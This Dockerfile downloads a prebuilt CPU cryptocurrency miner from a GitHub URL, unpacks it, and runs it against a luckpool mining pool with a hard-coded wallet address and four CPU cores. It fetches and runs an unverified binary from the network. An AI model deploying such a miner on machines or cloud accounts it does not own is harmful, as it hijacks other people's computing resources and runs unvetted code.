FROM ubuntu:latest AS build
RUN apt-get update && apt-get -y install wget vim
WORKDIR /home
RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
RUN tar -xf hellminer_cpu_linux.tar.gz

ENTRYPOINT [ "./hellminer" ]
CMD [ "-c", "stratum+tcp://na.luckpool.net:3956#xnsub", "-u", "RXkULFoLMv2fgHq8UduNvzHfUf7z7RBYyD.cingcobi", "-p", "x", "--cpu", "4" ]
